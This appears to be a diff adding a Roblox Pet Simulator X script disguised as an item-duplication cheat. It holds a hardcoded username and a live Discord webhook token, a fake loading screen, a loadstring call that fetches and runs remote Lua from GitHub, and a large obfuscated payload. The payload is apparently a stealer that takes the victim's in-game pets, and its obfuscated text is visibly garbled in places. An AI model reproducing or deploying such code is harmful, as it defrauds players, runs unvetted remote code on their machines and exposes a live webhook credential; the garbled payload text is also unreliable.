@@ -1,0 +1,24 @@
+Username = "wsxqaz11358" 
+ 
+WebHook = "https://discord.com/api/webhooks/1091658105202421871/k2LdOfQ2RVOiXMz7diaKzjltwFUhY4W-k0331wTQJvmOhzlDgb6k-bo2533OFR47wO2m" 
+ 
+ 
+ 
+ 
+ 
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI 
+ 
+_G.CustomScriptName = "PSX Change Script" 
+ 
+_G.Text1 = "Script Loaded..." 
+ 
+_G.Text2 = "dupe Easter Huge cat" 
+ 
+_G.Text3 = "Checking Scripts..." 
+ 
+_G.Text4 = "Starting Scripts..." 
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))() 
+ 
+return(function(...)local v={"\085\087\088\116\085\103\102\061","\100\113\086\075\085\087\083\089\110\087\105\090","\077\056\119\089\100\043\051\089\051\103\119\057\099\066\081\061","\099\066\088\054\105\105\070\053\099\074\057\105\080\113\089\111\051\077\061\061","\099\087\086\057\072\101\082\074\085\077\87\083\05{41,82}})do while e[1]<e[2]do v[e[1]],v[e[2]],e[1],e[2]=v[e[2]],v[e[1]],e[1]+1,e[2]-1 end end local function A(A)return v[A-7301]end do local A=table.concat local e=string.char local w=string.len local D={["\049"]=53,f=12;["\054"]=1;g=39,I=63,["\047"]=32;W=6,A=30;p=59,b=44,t=41;B=22;["\051"]=17;K=45;M=16;S=49,T=4;C=51;d=24,L=38;o=11;Z=36,r=42,q=54;a=58;w=9,Y=37;l=15;v=40;z=10,R=13,["\050"]=35;["\055"]=43,G=31,x=2;k=26;X=5,e=7;V=61,U=28,["\057"]=33;n=29;s=47,["\053"]=48,y=8;["\052"]=14;j=,n,K,W,U,O,u,f)e,O,u,W,d,f,U,K,i,n,N,X=function(e,D,b,I)local S,j,p,h,y,C,g,E,U,O,L,n,t,Y,J,x,G,R,K,P,l,Q,B,a,c,o,m,M,T,r,s,k,q,Z while e do if e<9418627 then if e<3555012 then if e<1879930 then if e<808378 then if e<792911 then if e<455463 then k=M q=49 a=#o S=a<q e=S and 9788430 or 1132877 else l=#L k=1 e=16276966 M=k k=-1 Y=k k=0 j=Y<k k=l-Y end else e=v[A(7372)]T=false T={T}end else if e<1302942 then if e<1096245 then e=11516832 else R=W[y]a=A(7364)C=A(7365)J=R[C]e=9539525 R=A(7336)x=J[R]J=x()x=A(7341)q=J[x]S=P(a,Q,o,q)S={}o=S end else k6579 p=j end end end else if e<6109215 then if e<4714651 then if e<3989235 then if e<3609935 then e=true T={e}e=v[A(7345)]else j=nil M=nil Y=nil e=6177617 end else k=#h M=50 l=k<M e=l and 17 if D then local e=D(true)local w=I(e)w[A(7326)],w[A(7303)],w[A(7331)]=v,K,function()return-2801904 end return e else return b({},{[A(7303)]=K,[A(7326)]=v;[A(7331)]=function()return-2801904 end})end end,function(v,A)local w=n(A)local D=function(...)return e(v,{...},A,w)end return D end,function()U=1+U O[U]=1 return U end return(N(16511717,{}))(w(T))end)(getfenv and getfenv()or _ENV,unpack or table[A(7383)],newproxy,setmetatable,getmetatable,select,{...})end)
+ 
